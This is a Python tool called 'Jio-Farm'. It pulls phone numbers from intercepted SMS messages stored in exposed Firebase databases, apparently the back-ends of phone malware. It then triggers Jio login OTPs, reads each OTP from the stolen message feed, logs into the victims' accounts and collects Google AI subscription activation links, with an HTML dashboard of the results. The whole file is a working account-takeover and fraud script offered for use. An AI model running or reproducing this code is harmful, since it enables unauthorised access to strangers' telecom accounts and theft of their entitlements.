"""Jio-Farm: harvest latest Jio numbers from exposed Firebase panels (firexpanel)
and farm Google AI (Gemini) activation links.

Usage:
  python jio_farm.py harvest [--limit N] [--skip N] [--message-limit N] [--verify-jio]
  python jio_farm.py activate [--limit N] [--numbers numbers.csv]
  python jio_farm.py panel   # regenerate HTML dashboard
  python jio_farm.py firexpanel <firebase_url>  # print firexpanel viewer URL
"""
from __future__ import annotations

import argparse
import base64
import csv
import html
import json
import re
import sys
import time
from collections import Counter, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any
from urllib.parse import unquote

import requests

BASE_DIR = Path(__file__).resolve().parent
PANELS_FILE = BASE_DIR / "panels.txt"
NUMBERS_CSV = BASE_DIR / "output" / "jio_numbers.csv"
NUMBERS_JSON = BASE_DIR / "output" / "jio_numbers.json"
RESULTS_CSV = BASE_DIR / "output" / "activation_results.csv"
LINKS_FILE = BASE_DIR / "output" / "activation_links.txt"
DASHBOARD_HTML = BASE_DIR / "output" / "panel.html"

MESSAGE_SCAN_LIMIT = 150
OTP_TIMEOUT = 20
POLL_INTERVAL = 1

CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

NUMBER_PATTERNS = (
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
)
OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password")
OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")
ACTIVATION_PATTERN = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})",
    re.IGNORECASE,
)

RESULT_FIELDS = ("serial_number", "device_id", "mobile_number", "status",
                 "activation_url", "nepal_date", "nepal_time")


def load_panels(path=None):
    file_path = Path(path) if path else PANELS_FILE
    if not file_path.exists():
        print(f"Panels file not found: {file_path}")
        return []
    panels = []
    seen = set()
    with file_path.open(encoding="utf-8") as handle:
        for raw_line in handle:
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split("|", 1)
            base_url = clean_firebase_url(parts[0])
            key = clean_firebase_key(parts[1]) if len(parts) > 1 else ""
            if not base_url or ("firebaseio.com" not in base_url and "firebasedatabase.app" not in base_url):
                continue
            entry = (base_url, key)
            if entry in seen:
                continue
            seen.add(entry)
            panels.append(entry)
    return panels


def clean_firebase_url(url):
    url = url.strip().replace(" ", "")
    if not url.startswith("https://"):
        url = "https://" + url
    return url


def clean_firebase_key(key):
    key = key.strip().replace(" ", "")
    if key.startswith("http"):
        return ""
    return key


def firebase_session():
    s = requests.Session()
    s.headers.update({"Accept": "application/json", "Cache-Control": "no-cache",
                      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    return s


def jio_session():
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
                      "Accept": "application/json, text/plain, */*",
                      "Accept-Language": "en-US,en;q=0.9",
                      "Origin": "https://www.jio.com",
                      "Referer": "https://www.jio.com/selfcare/login/"})
    return s


def firebase_get_with_retry(session, base_url, key, path, params=None, max_retries=3):
    query = {}
    if key and not key.startswith("http"):
        query["auth"] = key
    if params:
        query.update(params)
    for attempt in range(max_retries):
        try:
            r = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=20)
            r.raise_for_status()
            return r.json()
        except (requests.RequestException, ValueError):
            if attempt == max_retries - 1:
                raise
            time.sleep(1 * (attempt + 1))


def firebase_get(session, base_url, key, path, params=None):
    try:
        return firebase_get_with_retry(session, base_url, key, path, params)
    except Exception as e:
        return {}


def latest_messages(session, base_url, key, device_id, limit):
    try:
        data = firebase_get(session, base_url, key, f"messages/{device_id}",
                            {"orderBy": '"$key"', "limitToLast": max(1, limit)})
        if not isinstance(data, dict):
            return {}
        return {n: v for n, v in data.items() if isinstance(v, dict)}
    except Exception:
        return {}


def normalize_mobile(value):
    digits = re.sub(r"\D", "", str(value or ""))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None


PHONE_KEYS_HINTS = ("phone", "mobile", "msisdn", "number")

def _collect_numbers(obj, found: set[str]) -> None:
    """Recursively collect 10-digit Indian mobile candidates from any JSON object."""
    if isinstance(obj, dict):
        for k, v in obj.items():
            kl = str(k).lower()
            if any(h in kl for h in PHONE_KEYS_HINTS) or kl in {"to", "from", "recipient", "sender"}:
                m = normalize_mobile(v)
                if m:
                    found.add(m)
            _collect_numbers(v, found)
    elif isinstance(obj, list):
        for x in obj:
            _collect_numbers(x, found)
    elif isinstance(obj, str):
        for pat in NUMBER_PATTERNS:
            found.update(pat.findall(obj))
    elif isinstance(obj, int):
        s = str(obj)
        if re.fullmatch(r"[6-9]\d{9}", s):
            found.add(s)


def number_candidates(messages):
    found = set()
    _collect_numbers(messages, found)
    return found


def response_json(r):
    try:
        d = r.json()
    except ValueError:
        return {}
    return d if isinstance(d, dict) else {}


def response_error(r):
    if not r.ok:
        return True
    d = response_json(r)
    if d.get("errorMessage") or d.get("error"):
        return True
    return str(d.get("status", "")).lower() in {"failed", "failure", "error", "false"}


def is_jio_number(session, mobile):
    try:
        r = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=20)
    except requests.RequestException:
        return False
    d = response_json(r)
    return (not response_error(r)) and bool(d.get("primaryService"))


def send_otp(session, mobile):
    try:
        r = session.post(SEND_OTP_URL, json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""}, timeout=20)
    except requests.RequestException:
        return False
    return not response_error(r)


def verify_otp(session, mobile, otp):
    try:
        r = session.post(VERIFY_OTP_URL, json={"mobileNumber": mobile, "otp": otp}, timeout=20)
    except requests.RequestException:
        return False
    return not response_error(r)


def message_order(key, item):
    for v in (item.get("id"), item.get("timestamp"), key):
        try:
            return int(v)
        except (TypeError, ValueError):
            continue
    return 0


def wait_for_otp(firebase, base_url, key, device_id, known_keys, jio, mobile, otp_timeout=OTP_TIMEOUT, poll_interval=POLL_INTERVAL):
    used = set()
    deadline = time.monotonic() + otp_timeout
    while time.monotonic() < deadline:
        try:
            messages = latest_messages(firebase, base_url, key, device_id, 20)
        except requests.RequestException:
            time.sleep(poll_interval)
            continue
        cands = []
        for mk, item in messages.items():
            if mk in known_keys or mk in used:
                continue
            body = str(item.get("message", ""))
            if not OTP_WORD_PATTERN.search(body):
                continue
            m = OTP_PATTERN.search(body)
            if m:
                cands.append((message_order(mk, item), mk, m.group(1)))
        if cands:
            _, mk, otp = max(cands)
            used.add(mk)
            if verify_otp(jio, mobile, otp):
                return True
        time.sleep(poll_interval)
    return False


def activation_url(value):
    text = html.unescape(value or "")
    for _ in range(4):
        decoded = unquote(text)
        if decoded == text:
            break
        text = decoded
    m = ACTIVATION_PATTERN.search(text)
    if not m:
        return ""
    return "https://serviceactivation.google.com/subscription/new/" + m.group("token") + m.group("padding")


def already_active(value):
    normalized = " ".join((value or "").lower().replace("_", " ").split())
    return any(p in normalized for p in ("already active", "already activated", "already redeemed",
                                        "already claimed", "already availed", "already in use",
                                        "subscription already", "link has already been used", "already used"))


def api_message(data):
    for n in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if data.get(n):
            return str(data[n])
    return ""


def get_activation(session):
    dh = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    oh = {"Accept": "*/*", "Referer": GOOGLE_PAGE}
    try:
        ar = session.get(AUTH_URL, headers=dh, timeout=20)
        ad = response_json(ar)
        if not ar.ok or str(ad.get("loginFlag", "")).lower() != "true":
            return "api_session_invalid", ""
        session.get(NAVIGATE_URL, headers=dh, timeout=20)
        act = session.get(ACTIVATE_URL, headers=oh, timeout=20)
        actd = response_json(act)
        if already_active(api_message(actd)):
            return "already_active", ""
        if not act.ok or str(actd.get("errorCode", "200")) != "200":
            return "activation_api_failed", ""
        gr = session.get(GOOGLE_URL, headers=oh, timeout=20)
        gd = response_json(gr)
        if already_active(api_message(gd)):
            return "already_active", ""
        url = activation_url(str(gd.get("redirectionURL", "")))
        if not url:
            return "no_activation_url", ""
        try:
            session.get(SUBMIT_URL, headers=oh, timeout=20)
        except requests.RequestException:
            pass
        return "activation_url_found", url
    except requests.RequestException:
        return "activation_api_failed", ""


def get_nepal_time():
    utc = datetime.now(timezone.utc)
    return (utc + timedelta(hours=5, minutes=45)).strftime("%Y-%m-%d"), (utc + timedelta(hours=5, minutes=45)).strftime("%I:%M:%S %p")


def save_numbers(rows):
    NUMBERS_CSV.parent.mkdir(parents=True, exist_ok=True)
    with NUMBERS_CSV.open("w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=["mobile_number", "is_jio", "device_id", "panel_url", "harvested_at"])
        w.writeheader()
        for r in rows:
            w.writerow(r)
    with NUMBERS_JSON.open("w", encoding="utf-8") as f:
        json.dump(rows, f, indent=2, ensure_ascii=False)


def save_result(serial, device_id, mobile, status, url):
    RESULTS_CSV.parent.mkdir(parents=True, exist_ok=True)
    exists = RESULTS_CSV.exists() and RESULTS_CSV.stat().st_size > 0
    d, t = get_nepal_time()
    with RESULTS_CSV.open("a", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=RESULT_FIELDS)
        if not exists:
            w.writeheader()
        w.writerow({"serial_number": serial, "device_id": device_id, "mobile_number": mobile,
                    "status": status, "activation_url": url, "nepal_date": d, "nepal_time": t})


def save_link(url):
    if not url:
        return
    LINKS_FILE.parent.mkdir(parents=True, exist_ok=True)
    existing = set(LINKS_FILE.read_text(encoding="utf-8").splitlines()) if LINKS_FILE.exists() else set()
    if url in existing:
        return
    with LINKS_FILE.open("a", encoding="utf-8") as f:
        f.write(url + "\n")


def harvest(args):
    valid_panels = load_panels(args.panels)
    if args.skip:
        valid_panels = valid_panels[args.skip:]
    if args.limit:
        valid_panels = valid_panels[:args.limit]
    print("=" * 70)
    print(f"STEP 1: Loading panels: {len(valid_panels)}")
    print("=" * 70)

    all_online = {}
    device_messages = {}

    def scan_panel(idx, base_url, fkey):
        fb = firebase_session()
        try:
            clients = firebase_get(fb, base_url, fkey, "clients")
            if not isinstance(clients, dict):
                return idx, base_url, {}
            devices = {}
            for did, data in clients.items():
                if isinstance(data, dict):
                    devices[did] = {"base_url": base_url, "firebase_key": fkey,
                                     "firebase_session": fb, "data": data}
            return idx, base_url, devices
        except Exception as e:
            return idx, base_url, {"__error__": str(e)}

    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = {ex.submit(scan_panel, i, u, k): i for i, (u, k) in enumerate(valid_panels, 1)}
        for fut in as_completed(futs):
            idx, base_url, devices = fut.result()
            if "__error__" in devices:
                print(f"Panel {idx}/{len(valid_panels)}: {base_url} -> Error: {devices['__error__']}")
            else:
                if len(devices):
                    print(f"Panel {idx}/{len(valid_panels)}: {base_url} -> online: {len(devices)}")
                all_online.update(devices)

    print(f"\nTotal online devices: {len(all_online)}")
    if not all_online:
        print("No online devices found.")
        return 1

    print("\n" + "=" * 70)
    print("STEP 2: Scanning messages -> unique numbers")
    print("=" * 70)

    def scan_device(did, info):
        msgs = latest_messages(info["firebase_session"], info["base_url"], info["firebase_key"], did, args.message_limit)
        mobiles = number_candidates(msgs)
        # also extract from client record (e.g. webhookEvent.sendSms.to)
        mobiles |= number_candidates(info.get("data", {}))
        return did, msgs, mobiles

    mappings = defaultdict(set)
    total = len(all_online)
    scanned = 0
    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = {ex.submit(scan_device, did, info): did for did, info in all_online.items()}
        for fut in as_completed(futs):
            did, msgs, mobiles = fut.result()
            device_messages[did] = msgs
            for m in mobiles:
                mappings[m].add(did)
            scanned += 1
            if scanned % 15 == 0 or scanned == total:
                print(f"Scanned: {scanned}/{total}")

    targets = []
    for mobile, devs in sorted(mappings.items()):
        if devs:
            targets.append((sorted(devs)[0], mobile))

    print(f"\nTotal unique number candidates: {len(targets)}")
    if not targets:
        print("No numbers found.")
        return 1

    # verify Jio
    rows = []
    jio = jio_session()
    if args.verify_jio:
        print("\nVerifying Jio numbers...")
    for did, mobile in targets:
        info = all_online.get(did, {})
        isjio = is_jio_number(jio, mobile) if args.verify_jio else None
        rows.append({
            "mobile_number": mobile,
            "is_jio": (bool(isjio) if isjio is not None else "unverified"),
            "device_id": did,
            "panel_url": info.get("base_url", ""),
            "harvested_at": datetime.now(timezone.utc).isoformat(),
        })

    if args.verify_jio:
        jio_rows = [r for r in rows if r["is_jio"] is True]
        print(f"Jio verified: {len(jio_rows)}/{len(rows)}")

    save_numbers(rows)
    print(f"\nSaved: {NUMBERS_CSV} ({len(rows)} rows)")
    print(f"Saved: {NUMBERS_JSON}")
    return 0


def activate(args):
    # load numbers
    numbers = []
    if args.numbers and Path(args.numbers).exists():
        with open(args.numbers, newline="", encoding="utf-8") as f:
            for r in csv.DictReader(f):
                numbers.append(r["mobile_number"])
    elif NUMBERS_CSV.exists():
        with NUMBERS_CSV.open(newline="", encoding="utf-8") as f:
            for r in csv.DictReader(f):
                val = str(r.get("is_jio", "")).lower()
                if val in ("true", "1", "yes", "candidate", "assumed", "unverified"):
                    numbers.append(r["mobile_number"])
    else:
        print("No numbers file found. Run harvest first.")
        return 1

    # rebuild device map by re-harvesting panels (needed for firebase sessions)
    valid_panels = load_panels(args.panels)
    all_online = {}
    device_messages = {}

    def scan_panel(idx, base_url, fkey):
        fb = firebase_session()
        try:
            clients = firebase_get(fb, base_url, fkey, "clients")
            if not isinstance(clients, dict):
                return idx, base_url, {}
            devices = {}
            for did, data in clients.items():
                if isinstance(data, dict):
                    devices[did] = {"base_url": base_url, "firebase_key": fkey,
                                     "firebase_session": fb, "data": data}
            return idx, base_url, devices
        except Exception as e:
            return idx, base_url, {"__error__": str(e)}

    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = {ex.submit(scan_panel, i, u, k): i for i, (u, k) in enumerate(valid_panels, 1)}
        for fut in as_completed(futs):
            idx, base_url, devices = fut.result()
            if "__error__" not in devices:
                all_online.update(devices)

    # map mobile -> device
    mobile_to_device = {}
    for did, info in all_online.items():
        msgs = latest_messages(info["firebase_session"], info["base_url"], info["firebase_key"], did, 50)
        device_messages[did] = msgs
        nums = number_candidates(msgs) | number_candidates(info.get("data", {}))
        for m in nums:
            if m in numbers and m not in mobile_to_device:
                mobile_to_device[m] = did

    targets = []
    for m in numbers:
        did = mobile_to_device.get(m)
        if did:
            targets.append((did, m))
    if args.limit:
        targets = targets[:args.limit]

    print(f"Activating {len(targets)} numbers...")
    jio = jio_session()
    statuses = Counter()
    for serial, (did, mobile) in enumerate(targets, 1):
        info = all_online.get(did)
        if not info:
            continue
        print(f"\n[{serial}/{len(targets)}] {did} | ...{mobile[-4:]}")
        base_url = info["base_url"]
        fkey = info["firebase_key"]
        fb = info["firebase_session"]
        device = info["data"]
        known = set(device_messages.get(did, {}))
        if not send_otp(jio, mobile):
            status, url = "otp_send_failed", ""
        elif not wait_for_otp(fb, base_url, fkey, did, known, jio, mobile, args.otp_timeout, args.poll_interval):
            status, url = "otp_failed", ""
        else:
            status, url = get_activation(jio)
        statuses[status] += 1
        save_link(url)
        save_result(serial, did, mobile, status, url)
        print(f"Status: {status}")
        if url:
            print(f"LINK -> {url}")

    print("\n" + "=" * 70)
    print("FINAL SUMMARY")
    print("=" * 70)
    print(f"Total: {len(targets)}")
    for s, c in sorted(statuses.items()):
        print(f"{s:25}: {c}")
    print(f"Links: {LINKS_FILE}")
    print(f"Results: {RESULTS_CSV}")
    return 0


def panel(args):
    # build HTML dashboard
    rows = []
    if NUMBERS_CSV.exists():
        with NUMBERS_CSV.open(newline="", encoding="utf-8") as f:
            rows = list(csv.DictReader(f))
    results = []
    if RESULTS_CSV.exists():
        with RESULTS_CSV.open(newline="", encoding="utf-8") as f:
            results = list(csv.DictReader(f))
    links = []
    if LINKS_FILE.exists():
        links = [l.strip() for l in LINKS_FILE.read_text(encoding="utf-8").splitlines() if l.strip()]

    jio_count = sum(1 for r in rows if str(r.get("is_jio")).lower() in ("true", "candidate", "assumed", "unverified"))
    html_doc = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><title>Jio-Farm Panel</title>
<style>
body{{font-family:system-ui,Arial,sans-serif;background:#0b0f14;color:#e6edf3;margin:0;padding:20px}}
h1{{color:#58a6ff}} .card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin:12px 0}}
table{{width:100%;border-collapse:collapse}} th,td{{padding:8px;border-bottom:1px solid #30363d;font-size:13px}}
th{{background:#21262d;text-align:left}} tr:hover{{background:#1c2128}}
.badge{{padding:2px 8px;border-radius:12px;font-size:11px}} .jio{{background:#238636}} .no{{background:#da3633}} .unv{{background:#6e7681}}
a{{color:#58a6ff}}
</style></head><body>
<h1>Jio-Farm Panel — Latest Jio Numbers</h1>
<div class="card">Total numbers: <b>{len(rows)}</b> | Jio verified: <b>{jio_count}</b> | Activation links: <b>{len(links)}</b> | Results: <b>{len(results)}</b></div>
<div class="card"><h3>Latest Jio Numbers</h3><table><tr><th>#</th><th>Mobile</th><th>Jio</th><th>Device</th><th>Panel</th></tr>
"""
    for i, r in enumerate(rows[:500], 1):
        isjio = str(r.get("is_jio")).lower()
        cls = "jio" if isjio in ("true", "candidate", "assumed", "unverified") else ("no" if isjio == "false" else "unv")
        label = "Jio" if isjio == "true" else ("Candidate" if isjio in ("candidate", "assumed", "unverified") else "No")
        html_doc += f"<tr><td>{i}</td><td>{r.get('mobile_number','')}</td><td><span class='badge {cls}'>{label}</span></td><td>{r.get('device_id','')}</td><td style='font-size:11px'>{r.get('panel_url','')}</td></tr>\n"
    html_doc += "</table></div>\n<div class='card'><h3>Activation Links</h3><ul>"
    for l in links:
        html_doc += f"<li><a href='{l}' target='_blank'>{l}</a></li>\n"
    html_doc += "</ul></div>\n<div class='card'><h3>Results</h3><table><tr><th>#</th><th>Mobile</th><th>Status</th><th>Link</th></tr>\n"
    for r in results:
        html_doc += f"<tr><td>{r.get('serial_number','')}</td><td>{r.get('mobile_number','')}</td><td>{r.get('status','')}</td><td>{r.get('activation_url','')}</td></tr>\n"
    html_doc += "</table></div></body></html>"
    DASHBOARD_HTML.parent.mkdir(parents=True, exist_ok=True)
    DASHBOARD_HTML.write_text(html_doc, encoding="utf-8")
    print(f"Dashboard written: {DASHBOARD_HTML}")
    return 0


def firexpanel(args):
    url = args.url
    payload = f"{url}||{url}"
    b64 = base64.b64encode(payload.encode()).decode()
    print(f"https://firexpanel.com/?s={b64}")
    return 0


def main():
    parser = argparse.ArgumentParser(description="Jio-Farm")
    sub = parser.add_subparsers(dest="cmd", required=True)

    h = sub.add_parser("harvest")
    h.add_argument("--panels", default=str(PANELS_FILE))
    h.add_argument("--limit", type=int, default=0)
    h.add_argument("--skip", type=int, default=0)
    h.add_argument("--message-limit", type=int, default=MESSAGE_SCAN_LIMIT)
    h.add_argument("--verify-jio", action="store_true")
    h.set_defaults(func=harvest)

    a = sub.add_parser("activate")
    a.add_argument("--panels", default=str(PANELS_FILE))
    a.add_argument("--numbers", default=None)
    a.add_argument("--limit", type=int, default=0)
    a.add_argument("--otp-timeout", type=int, default=OTP_TIMEOUT)
    a.add_argument("--poll-interval", type=int, default=POLL_INTERVAL)
    a.set_defaults(func=activate)

    p = sub.add_parser("panel")
    p.set_defaults(func=panel)

    f = sub.add_parser("firexpanel")
    f.add_argument("url")
    f.set_defaults(func=firexpanel)

    args = parser.parse_args()
    sys.exit(args.func(args))


if __name__ == "__main__":
    main()
